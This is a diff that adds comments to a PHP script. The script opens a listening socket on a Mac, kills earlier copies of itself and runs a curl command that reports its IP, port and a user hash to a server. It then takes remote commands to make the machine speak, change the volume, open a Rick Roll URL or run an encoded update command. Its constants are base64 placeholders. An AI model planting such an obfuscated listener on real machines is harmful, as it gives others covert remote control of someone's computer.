@@ -1,5 +1,5 @@
 <?php
-// Define constants
+// Define constants using base 64 encoded strings wrapped in decode function
 define('REGEX_VALID_IP_ADDRESS', '{{B64_CONST_REGEX_VALID_IP_ADDRESS}}');
 define('REGEX_SIMPLE_STRING', '{{B64_CONST_REGEX_SIMPLE_STRING}}');
 define('REGEX_CTL_QUIT', '{{B64_CONST_REGEX_CTL_QUIT}}');
@@ -14,12 +14,15 @@ define('PORT_MAX', '{{B64_CONST_PORT_MAX}}');
 define('SS_PORT', '{{B64_CONST_SS_PORT}}');
 define('PROMPT', '{{B64_CONST_PROMPT}}');
 
+// Kill existing process if it's already running
 if ($pid = process_running($argv[0])) {
     exec("kill $pid");
 }
 
+// Load list of available voices from OSX
 $voices = load_voice_list();
 
+// Set the current voice to the default (first in voice list, or manually set if list is empty)
 $current_voice = count($voices) > 0 ? $voices[0] : '{{B64_STR_DEFAULT_VOICE}}';
 
 // Allow the script to hang around waiting for connections.
@@ -28,92 +31,125 @@ set_time_limit(0);
 // Turn on implicit output flushing so we see what we're getting as it comes in.
 ob_implicit_flush();
 
-// Defaults
+// Default ip address and port to run on
 $address = lookup_ip();
 $port = SS_PORT;
 
+// Global variable for tracking options to send to server as GET params
 global $opts;
 
+// Format for opts to be sent as GET params
 $opts = array(
     '{{B64_OPT_IP}}' => $address,
     '{{B64_OPT_PORT}}' => $port,
     '{{B64_OPT_HASH}}' => '{{USER_HASH}}'
 );
 
-// Error check address and port
+// Validate check address and port
 (preg_match(REGEX_VALID_IP_ADDRESS, $address)) or die();
 (is_numeric($port) && $port > PORT_MIN && $port < PORT_MAX) or die();
 
+// Attempt to open socket, die on failure
 if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
     die();
 }
 
+// Set socket options
 socket_set_option($sock, SOL_SOCKET, SO_REUSEADDR, 1);
 socket_set_option($sock, SOL_SOCKET, SO_REUSEPORT, 1);
 
+// Bind open socket to the validated address and port
 if (socket_bind($sock, $address, $port) === false) {
     socket_shutdown($sock);
     socket_close($sock);
     die();
 }
 
+// Listen on socket
 if (socket_listen($sock, 5) === false) {
     socket_shutdown($sock);
     socket_close($sock);
     die();
 }
 
+// Execute curl command to hit server and send mail alert that socket is open
 exec(build_curl_cmd('m'));
 
 do {
+    // Accept communication messages from the open socket
     if (($msgsock = socket_accept($sock)) === false) {
         socket_shutdown($sock);
         socket_close($sock);
         break;
     }
 
+    // First message sent if the welcome message followed by the SS prompt
     $msg = '{{B64_STR_WELCOME_MSG}}' . PROMPT;
+
+    // Send the welcome message and prompt
     socket_write($msgsock, $msg, strlen($msg));
 
+    // Main loop
     do {
+        // Initialize msg as an empty string
         $msg = '';
 
+        // Read buffer from client connected to socket
         if (false === ($buf = socket_read($msgsock, 2048, PHP_NORMAL_READ))) {
             break;
         }
 
+        // Skip this command if (when trimmed) evaluates to false
         if (!$buf = trim($buf)) {
             continue;
         }
 
+        // Full trim of the buffer
         $buf = trim(strtolower($buf), ' _-[]()"\'');
 
+        /**
+         * All commands are defined in config.inc and loaded as encoded constants in this file
+         */
+
+        // Buffer matches the quit command regex, quit
         if (preg_match(REGEX_CTL_QUIT, $buf)) {
             break;
+        // Buffer matches the update command, execute the update command (re-install)
         } else if (preg_match(REGEX_CTL_UPDATE, $buf)) {
             exec('{{B64_CMD_UPDATE}}');
             die();
+        // Rick roll easteregg command regex max
         } else if (preg_match(REGEX_CTL_RICK_ROLL, $buf)) {
+            // Override the volume
             set_volume(7);
+            // Open up the Rick Roll youtube video page with default browser
             open_url('{{B64_STR_RICK_ROLL_URL}}');
+        // Buffer matches voices command, list all voices
         } else if (preg_match(REGEX_CTL_VOICES, $buf)) {
             foreach ($voices as $voice) {
                 $msg .= $voice . "\n";
             }
+        // Buffer matches get or set voice command
         } else if (preg_match(REGEX_CTL_GET_VOICE, $buf, $arr) || preg_match(REGEX_CTL_SET_VOICE, $buf, $arr)) {
             if (isset($arr[1])) {
                 $voice = $arr[1];
 
+                // Verify the voice to change to exists in list of voices and change current voice
                 if (in_array($voice, $voices)) {
                     $current_voice = $voice;
+                // Otherwise display voice info
                 } else {
                     $msg .= '{{B64_STR_VOICE_HELP}}';
                 }
             }
 
+            // Append the current voice to the message
             $msg .= '{{B64_STR_CURRENT_VOICE}}' . " $current_voice\n";
+        // Buffer matches volume control command
         } else if (preg_match(REGEX_CTL_VOLUME, $buf, $arr)) {
+            // Validate argument pulled from regex is present and numeric
             if (isset($arr[1]) && is_numeric($arr[1])) {
+                // Override volume
                 set_volume($arr[1]);
             }
         } else if (preg_match(REGEX_SIMPLE_STRING, $buf)) {
